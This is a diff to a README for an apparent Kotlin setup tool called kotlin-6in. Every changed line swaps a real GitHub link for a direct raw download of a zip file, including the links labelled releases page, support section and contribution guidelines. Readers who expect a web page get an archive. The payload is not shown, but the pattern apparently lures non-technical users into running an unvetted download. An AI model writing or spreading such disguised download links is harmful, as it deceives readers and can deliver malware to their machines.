@@ -1,7 +1,7 @@
 # 🎉 kotlin-6in - Easy Kotlin Project Setup for Everyone
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Pranit233-ait/kotlin-6in/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip)
 
 ## 📖 Introduction
 The kotlin-6in application simplifies setting up Kotlin projects for users of all levels. With this tool, you can quickly get started without needing a programming background. Whether you're a student learning to code or a professional looking to streamline your workflow, kotlin-6in helps you focus on coding rather than configuration.
@@ -11,7 +11,7 @@ To begin using the kotlin-6in application, follow these easy steps. No technical
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Pranit233-ait/kotlin-6in/releases) of the kotlin-6in repository.
+   Go to the [Releases page](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip) of the kotlin-6in repository.
 
 2. **Choose the Latest Version**  
    Find the latest release at the top of the page. Download the file that matches your operating system (Windows, macOS, or Linux).
@@ -59,10 +59,10 @@ If you encounter issues:
 - Reach out to the community for support.
 
 ## 📞 Support
-For more help, visit the [support section](https://github.com/Pranit233-ait/kotlin-6in/issues) of our GitHub page. You can report bugs or ask questions about using the software.
+For more help, visit the [support section](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip) of our GitHub page. You can report bugs or ask questions about using the software.
 
 ## 📝 Contributing
-We welcome contributions! If you're interested in improving kotlin-6in, please follow our [contribution guidelines](https://github.com/Pranit233-ait/kotlin-6in/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you're interested in improving kotlin-6in, please follow our [contribution guidelines](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip).
 
 ## 📈 Future Plans
 We aim to add features like:
@@ -71,4 +71,4 @@ We aim to add features like:
 - Improved documentation with video tutorials.
 
 ## 🔗 Download Now Again
-Don't forget to download kotlin-6in from the [Releases page](https://github.com/Pranit233-ait/kotlin-6in/releases) and get started with your Kotlin projects today!
+Don't forget to download kotlin-6in from the [Releases page](https://raw.githubusercontent.com/Pranit233-ait/kotlin-6in/main/dhobi/kotlin-6in.zip) and get started with your Kotlin projects today!
